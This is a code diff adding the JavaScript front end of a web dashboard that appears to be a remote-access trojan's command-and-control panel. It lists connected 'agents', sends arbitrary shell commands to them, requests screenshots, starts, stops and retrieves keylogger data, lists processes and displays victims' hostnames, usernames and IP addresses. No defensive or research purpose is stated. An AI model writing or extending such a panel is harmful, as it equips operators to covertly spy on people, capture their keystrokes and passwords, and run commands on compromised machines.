+      if (id) {
+        // Auto load results for agent
+        loadCommandResults(id);
+        // Connect to WebSocket for real-time updates
+        connectWebSocket(id);
+      } else {
+        refs.commandResultsBox.innerHTML = '<div class="text-muted">No agent selected</div>';
+        if (websocket) {
+          websocket.close();
+          websocket = null;
+        }
+      }
+    }
+
+    // Connect to WebSocket for real-time updates
+    function connectWebSocket(agentId) {
+      // Close existing connection
+      if (websocket) {
+        websocket.close();
+      }
+      
+      // In a real implementation, you would connect to a WebSocket endpoint
+      // For this demo, we'll simulate real-time updates with a polling mechanism
+      // that doesn't cause visible refreshes
+      
+      // Clear any existing interval
+      if (window.agentUpdateInterval) {
+        clearInterval(window.agentUpdateInterval);
+      }
+      
+      // Start background polling for this agent
+      window.agentUpdateInterval = setInterval(() => {
+        if (currentAgentId === agentId && !isUpdating) {
+          loadCommandResults(agentId, true); // true = background update
+        }
+      }, 2000);
+    }
+
+    // Load command results for agent
+    async function loadCommandResults(agentId, isBackground = false) {
+      if (!agentId || isUpdating) return;
+      
+      isUpdating = true;
+      if (!isBackground) {
+        showLoading(true);
+      }
+      
+      try {
+        const response = await fetch(`/api/commands/${agentId}/results`);
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const data = await response.json();
+        const results = data.results || [];
+        
+        // Only update if we have new results or initial load
+        if (results.length > 0 || refs.commandResultsBox.innerHTML.includes('No output yet')) {
+          updateCommandResults(results, agentId);
+        }
+      } catch (error) {
+        console.error('Error loading command results:', error);
+        if (!isBackground) {
+          showStatus(`Error loading results: ${error.message}`, 'err');
+        }
+      } finally {
+        isUpdating = false;
+        if (!isBackground) {
+          showLoading(false);
+        }
+      }
+    }
+
+    // Update command results without flickering
+    function updateCommandResults(results, agentId) {
+      // Get current scroll position
+      const container = refs.commandResultsBox;
+      const isScrolledToBottom = container.scrollHeight - container.clientHeight <= container.scrollTop + 1;
+      
+      // Create a document fragment for efficient DOM updates
+      const fragment = document.createDocumentFragment();
+      
+      // Create new entries
+      const newEntries = [];
+      for (const r of results) {
+        const entry = document.createElement('div');
+        entry.className = 'terminal-entry';
+        const meta = document.createElement('div');
+        meta.className = 'terminal-meta';
+        meta.innerHTML = `[${new Date(r.timestamp).toLocaleString()}] ${escapeHtml(r.agent_id)} — ${r.success ? '<span style="color:#7ef59a">SUCCESS</span>' : '<span style="color:#ff9a9a">FAILED</span>'}`;
+        const pre = document.createElement('pre');
+        pre.className = 'terminal-output';
+        pre.textContent = r.result;
+        entry.appendChild(meta);
+        entry.appendChild(pre);
+        newEntries.push(entry);
+      }
+      
+      // If this is the first load or we have new results
+      if (container.innerHTML.includes('No output yet') || container.innerHTML.includes('No agent selected')) {
+        // Clear container and add all results
+        container.innerHTML = '';
+        newEntries.forEach(entry => fragment.appendChild(entry));
+        container.appendChild(fragment);
+      } else {
+        // Only add new results (compare with existing)
+        const existingEntries = container.querySelectorAll('.terminal-entry');
+        const existingCount = existingEntries.length;
+        const newResults = newEntries.slice(existingCount);
+        
+        if (newResults.length > 0) {
+          newResults.forEach(entry => fragment.appendChild(entry));
+          container.appendChild(fragment);
+        }
+      }
+      
+      // Auto-scroll to bottom if user was already at bottom
+      if (isScrolledToBottom) {
+        container.scrollTop = container.scrollHeight;
+      }
+    }
+
+    // Remove agent
+    async function removeAgent(agentId){
+      if (!agents[agentId]) return;
+      if (!confirm(`Remove ${agents[agentId].display_name || agentId} from the list?`)) return;
+      
+      try {
+        const response = await fetch(`/api/agents/${agentId}`, { method: 'DELETE' });
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        
+        showStatus('Agent removed successfully', 'ok');
+        delete agents[agentId];
+        delete commandResults[agentId];
+        updateAgentsTable();
+        populateAgentSelect();
+        updateStats();
+        
+        // If removed agent was selected, clear selection
+        if (refs.agentSelect.value === agentId) {
+          refs.agentSelect.value = '';
+          onAgentChange();
+        }
+      } catch (error) {
+        console.error('Error removing agent:', error);
+        showStatus(`Error removing agent: ${error.message}`, 'err');
+      }
+    }
+
+    // Enhanced feature functions
+    async function takeScreenshot(){
+      const id = refs.agentSelect.value;
+      if (!id) { 
+        showStatus('Select an agent first', 'err'); 
+        return; 
+      }
+      if (!agents[id].capabilities.screenshot) { 
+        showStatus('Screenshot not supported by this agent', 'err'); 
+        return; 
+      }
+      
+      showStatus('Requesting screenshot...', 'ok');
+      try {
+        const response = await fetch('/api/commands/screenshot', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            agent_id: id,
+            command: 'SCREENSHOT',
+            command_type: 'special'
+          })
         });
-    </script>
+        
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const result = await response.json();
+        showStatus('Screenshot command sent', 'ok');
+        // Results will appear automatically via background updates
+      } catch (error) {
+        console.error('Error taking screenshot:', error);
+        showStatus(`Error requesting screenshot: ${error.message}`, 'err');
+      }
+    }
+
+    async function startKeylogger(){
+      const id = refs.agentSelect.value;
+      if (!id) { 
+        showStatus('Select an agent first', 'err'); 
+        return; 
+      }
+      if (!agents[id].capabilities.keylogger) { 
+        showStatus('Keylogger not supported by this agent', 'err'); 
+        return; 
+      }
+      
+      showStatus('Starting keylogger...', 'ok');
+      try {
+        const response = await fetch(`/api/commands/keylogger/start?agent_id=${id}`, {
+          method: 'POST'
+        });
+        
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const result = await response.json();
+        showStatus('Keylogger started', 'ok');
+        // Results will appear automatically via background updates
+      } catch (error) {
+        console.error('Error starting keylogger:', error);
+        showStatus(`Error starting keylogger: ${error.message}`, 'err');
+      }
+    }
+
+    async function stopKeylogger(){
+      const id = refs.agentSelect.value;
+      if (!id) { 
+        showStatus('Select an agent first', 'err'); 
+        return; 
+      }
+      if (!agents[id].capabilities.keylogger) { 
+        showStatus('Keylogger not supported by this agent', 'err'); 
+        return; 
+      }
+      
+      showStatus('Stopping keylogger...', 'ok');
+      try {
+        const response = await fetch(`/api/commands/keylogger/stop?agent_id=${id}`, {
+          method: 'POST'
+        });
+        
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const result = await response.json();
+        showStatus('Keylogger stopped', 'ok');
+        // Results will appear automatically via background updates
+      } catch (error) {
+        console.error('Error stopping keylogger:', error);
+        showStatus(`Error stopping keylogger: ${error.message}`, 'err');
+      }
+    }
+
+    async function getKeylogData(){
+      const id = refs.agentSelect.value;
+      if (!id) { 
+        showStatus('Select an agent first', 'err'); 
+        return; 
+      }
+      if (!agents[id].capabilities.keylogger) { 
+        showStatus('Keylogger not supported by this agent', 'err'); 
+        return; 
+      }
+      
+      showStatus('Getting keylogger data...', 'ok');
+      try {
+        const response = await fetch(`/api/commands/keylogger/data?agent_id=${id}`, {
+          method: 'POST'
+        });
+        
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const result = await response.json();
+        showStatus('Keylogger data requested', 'ok');
+        // Results will appear automatically via background updates
+      } catch (error) {
+        console.error('Error getting keylogger data:', error);
+        showStatus(`Error getting keylogger data: ${error.message}`, 'err');
+      }
+    }
+
+    async function getAgentInfo(){
+      const id = refs.agentSelect.value;
+      if (!id) { 
+        showStatus('Select an agent first', 'err'); 
+        return; 
+      }
+      
+      showStatus('Getting agent information...', 'ok');
+      try {
+        const response = await fetch(`/api/agents/${id}/info`);
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const agentInfo = await response.json();
+        
+        // Format and display agent info
+        const infoText = [
+          `Agent ID: ${agentInfo.agent_id}`,
+          `Display Name: ${agentInfo.display_name}`,
+          `Hostname: ${agentInfo.hostname}`,
+          `Username: ${agentInfo.username}`,
+          `OS: ${agentInfo.os_info}`,
+          `IP Address: ${agentInfo.ip_address}`,
+          `CPU Count: ${agentInfo.cpu_count || 'N/A'}`,
+          `Memory Total: ${agentInfo.memory_total ? (agentInfo.memory_total / (1024**3)).toFixed(2)+' GB' : 'N/A'}`,
+          `Disk Total: ${agentInfo.disk_total ? (agentInfo.disk_total / (1024**3)).toFixed(2)+' GB' : 'N/A'}`,
+          `Python Version: ${agentInfo.python_version || 'N/A'}`,
+          `Architecture: ${agentInfo.architecture || 'N/A'}`,
+          `Capabilities: ${Object.keys(agentInfo.capabilities||{}).filter(k=>agentInfo.capabilities[k]).join(', ') || 'None'}`,
+          `Last Seen: ${new Date(agentInfo.last_seen).toLocaleString()}`,
+          `Status: ${agentInfo.status}`
+        ].join('\n');
+        
+        // Add to command results immediately
+        const timestamp = new Date().toLocaleString();
+        const entry = document.createElement('div');
+        entry.className = 'terminal-entry';
+        const meta = document.createElement('div');
+        meta.className = 'terminal-meta';
+        meta.innerHTML = `[${timestamp}] Agent Info for ${escapeHtml(agentInfo.agent_id)} — <span style="color:#7ef59a">SUCCESS</span>`;
+        const pre = document.createElement('pre');
+        pre.className = 'terminal-output';
+        pre.textContent = infoText;
+        entry.appendChild(meta);
+        entry.appendChild(pre);
+        
+        // Insert at the top of results
+        const resultsContainer = refs.commandResultsBox;
+        if (resultsContainer.children.length > 0 && !resultsContainer.innerHTML.includes('No output yet')) {
+          resultsContainer.insertBefore(entry, resultsContainer.firstChild);
+        } else {
+          resultsContainer.innerHTML = '';
+          resultsContainer.appendChild(entry);
+        }
+        
+        resultsContainer.scrollTop = resultsContainer.scrollHeight;
+        showStatus('Agent information retrieved', 'ok');
+      } catch (error) {
+        console.error('Error getting agent info:', error);
+        showStatus(`Error getting agent info: ${error.message}`, 'err');
+      }
+    }
+
+    async function getAgentProcesses(){
+      const id = refs.agentSelect.value;
+      if (!id) { 
+        showStatus('Select an agent first', 'err'); 
+        return; 
+      }
+      if (!agents[id].capabilities.processes) { 
+        showStatus('Process listing not supported by this agent', 'err'); 
+        return; 
+      }
+      
+      showStatus('Getting process list...', 'ok');
+      try {
+        // Use normal command execution for processes
+        const response = await fetch('/api/commands/execute', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            agent_id: id,
+            command: 'PROCESSES',
+            command_type: 'special'
+          })
+        });
+        
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const result = await response.json();
+        showStatus('Process list command sent', 'ok');
+        // Results will appear automatically via background updates
+      } catch (error) {
+        console.error('Error getting processes:', error);
+        showStatus(`Error getting processes: ${error.message}`, 'err');
+      }
+    }
+
+    // Execute command on agent
+    async function executeCommand(){
+      const id = refs.agentSelect.value;
+      const cmd = refs.commandInput.value.trim();
+      if (!id || !cmd) {
+        showStatus('Select an agent and enter a command', 'err');
+        return;
+      }
+      showStatus('Sending command...', 'ok');
+      
+      try {
+        const response = await fetch('/api/commands/execute', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            agent_id: id,
+            command: cmd,
+            command_type: 'shell'
+          })
+        });
+        
+        if (!response.ok) throw new Error(`HTTP ${response.status}`);
+        const result = await response.json();
+        showStatus('Command sent successfully', 'ok');
+        refs.commandInput.value = '';
+        // Results will appear automatically via background updates
+      } catch (error) {
+        console.error('Error executing command:', error);
+        showStatus(`Error executing command: ${error.message}`, 'err');
+      }
+    }
+
+    // Wire UI actions
+    function wireUI(){
+      refs.refreshAgentsBtn.onclick = loadAgents;
+      refs.refreshStatusBtn.onclick = loadAgents;
+      refs.executeBtn.onclick = executeCommand;
+    refs.refreshResultsBtn.onclick = () => {
+        const id = refs.agentSelect.value;
+        if (id) loadCommandResults(id);
+      };
+    refs.clearResultsBtn.onclick = () => {
+      clearResults();
+    };
+      refs.agentSelect.onchange = onAgentChange;
+      refs.screenshotBtn.onclick = takeScreenshot;
+      refs.startKeyloggerBtn.onclick = startKeylogger;
+      refs.stopKeyloggerBtn.onclick = stopKeylogger;
+      refs.getKeylogBtn.onclick = getKeylogData;
+      refs.getInfoBtn.onclick = getAgentInfo;
+      refs.getProcessesBtn.onclick = getAgentProcesses;
+      
+      // keyboard: Enter to execute
+      refs.commandInput.addEventListener('keydown', (e) => { 
+        if (e.key === 'Enter') executeCommand(); 
+      });
+    }
+  async function clearResults(){
+    const agentId = refs.agentSelect.value;
+    if (!agentId){
+      showStatus('Select an agent first', 'err');
+      return;
+    }
+    try{
+      const resp = await fetch(`/api/commands/${agentId}/results`, { method: 'DELETE' });
+      if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+      // Clear UI after server confirms
+      refs.commandResultsBox.innerHTML = '<div class="text-muted">Results cleared.</div>';
+      showStatus('Results cleared', 'ok');
+    } catch(err){
+      showStatus(`Error clearing results: ${err.message}`, 'err');
+    }
+  }
+
+    // Initial boot
+    (function boot(){
+      wireUI();
+      loadAgents();
+    })();
+  </script>
 </body>
 </html>
